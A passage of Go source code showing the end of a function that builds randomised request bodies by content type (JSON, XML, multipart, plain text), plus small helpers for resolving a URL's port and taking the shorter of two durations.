				if i > 0 {
					b.WriteByte(',')
				}
				fmt.Fprintf(b, `"%s":"%s"`, randomString(rng, 5), randomString(rng, 8))
			}
			b.WriteByte('}')
		}

	case strings.HasPrefix(ct, "application/xml") || strings.HasPrefix(ct, "text/xml"):
		fmt.Fprintf(b, `<?xml version="1.0"?><request><id>%d</id><data>%s</data></request>`,
			rng.Intn(10000), randomString(rng, 10))

	case strings.HasPrefix(ct, "multipart/form-data"):
		b.WriteString("multipart_body")

	default:
		b.WriteString("text_" + randomString(rng, 12))
	}
	return b.Bytes()
}

// ─── Misc helpers ─────────────────────────────────────────────────────────────

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if i, err := strconv.Atoi(p); err == nil {
			return i
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}
